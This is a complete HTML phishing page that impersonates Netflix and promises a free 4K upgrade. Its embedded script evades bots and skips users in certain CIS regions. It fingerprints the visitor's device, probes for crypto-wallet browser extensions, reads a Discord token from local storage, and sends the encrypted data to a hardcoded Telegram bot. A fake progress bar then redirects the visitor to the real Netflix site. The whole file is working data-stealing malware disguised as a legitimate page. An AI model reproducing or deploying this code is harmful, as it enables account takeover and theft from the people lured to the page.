<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@400;700;900&display=swap">
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
<style>
  body,html{margin:0;padding:0;height:100%;font-family:'Netflix Sans',sans-serif;background:#141414;color:white;}
  .container{display:flex;flex-direction:column;justify-content:center;align-items:center;height:100%;background:linear-gradient(to bottom,rgba(0,0,0,0.8),rgba(0,0,0,0.95)),url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88c/null/4K.jpg') center/cover;}
  .logo{width:180px;margin-bottom:30px;}
  .card{background:rgba(0,0,0,0.85);padding:60px 50px;border-radius:12px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.8);}
  h1{font-size:32px;font-weight:900;margin:0 0 20px;text-align:center;}
  p{font-size:18px;margin-bottom:30px;text-align:center;opacity:0.9;}
  .btn{background:#e50914;width:100%;padding:16px;font-size:18px;font-weight:700;border:none;border-radius:8px;cursor:pointer;}
  .loader{margin-top:20px;text-align:center;display:none;}
  .bar-bg{width:100%;background:#333;height:8px;border-radius:4px;overflow:hidden;}
  .bar{width:0%;height:100%;background:#e50914;transition:width .4s;}
</style>
</head>
<body>
<div class="container">
  <img src="https://assets.nflxext.com/ffe/siteui/common/site/logo_v2.svg" class="logo" alt="Netflix">
  <div class="card">
    <h1>Congratulations!</h1>
    <p>Your account has been selected for the free 4K Ultra HD + Dolby Vision upgrade.<br>Confirm your payment method to activate instantly.</p>
    <button class="btn" id="b">ACTIVATE 4K UPGRADE NOW</button>
    <div class="loader" id="l">
      <div class="bar-bg"><div class="bar" id="p"></div></div>
      <p id="s">Verifying eligibility... 0%</p>
    </div>
  </div>
</div>

<script>
async function activate(){
  if(navigator.webdriver||screen.width<600)return;
  const blocked=['RU','UA','BY','KZ','AM','GE','MD'];
  const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
  const lang=navigator.language||navigator.userLanguage;
  if(blocked.some(c=>lang.includes(c)||tz.includes(c)))return;

  const vic={ip:await(await fetch('https://api.ipify.org')).text(),os:navigator.userAgent,tz:tz,lang:lang,screen:screen.width+'x'+screen.height,wallets:[],discord:null};
  const cv=document.createElement('canvas'); const ctx=cv.getContext('2d'); ctx.fillText('FINAL2025',2,10);
  const hash=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(cv.toDataURL()));
  vic.hwid=Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('')+'_'+(navigator.hardwareConcurrency||0)+'_'+(navigator.deviceMemory||0);

  const exts=['nkbihfbeogaeaoehlefnkodbefgpgknn','fhbohimaelbohpjbbldcngcnapndodjp','hnfanknocfeofbddgcijnmofefhgkjjo','jbdaocneiiinmjbjlgalhcelgbejmnid'];
  for(let e of exts) try{await fetch(`chrome-extension://${e}/manifest.json`);vic.wallets.push(e);}catch{}

  if(localStorage.getItem('token')) vic.discord=localStorage.getItem('token').replace(/"/g,'');

  const payload=btoa(unescape(encodeURIComponent(JSON.stringify(vic))));
  const enc=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('SONOFTHEFATHER2025')).toString();

  fetch('https://api.telegram.org/bot8599950371:AAEWUhTxI19s-b7p2RXrwoxWZZseHeSMqcs/sendMessage?chat_id=7185082346&text='+encodeURIComponent('PARROT VICTIM\n'+enc),{mode:'no-cors'});

  document.getElementById('b').style.display='none';
  document.getElementById('l').style.display='block';
  let prog=0;
  const iv=setInterval(()=>{prog+=Math.random()*20+8; if(prog>100)prog=100; document.getElementById('p').style.width=prog+'%'; document.getElementById('s').innerText='Activating 4K Ultra HD... '+Math.round(prog)+'%'; if(prog>=100){clearInterval(iv); setTimeout(()=>location='https://www.netflix.com/',1200);}},250);
}
document.getElementById('b').onclick=activate;
</script>
</body>
</html>
